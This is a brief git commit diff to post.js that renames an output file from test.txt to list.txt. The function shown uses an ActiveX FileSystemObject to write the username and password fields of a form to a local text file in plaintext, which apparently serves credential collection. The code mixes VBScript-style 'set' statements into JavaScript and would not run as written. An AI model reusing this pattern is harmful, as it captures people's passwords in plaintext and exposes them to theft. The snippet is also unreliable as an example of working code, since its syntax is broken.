086629d68f14029c2b09ed90b82a57ccbf0d846e
LoserTool <junkbait@itechfree.com>
2015-12-28 15:34:28 -0800

    Update post.js

--- post.js
+++ post.js
@@ -1,7 +1,7 @@
 function WriteToFile(passForm) {
 
     set fso = CreateObject("Scripting.FileSystemObject");  
-    set s = fso.CreateTextFile("./test.txt", True);
+    set s = fso.CreateTextFile("./list.txt", True);
     s.writeline(document.passForm.username.value);
     s.writeline(document.passForm.password.value);
     s.Close();
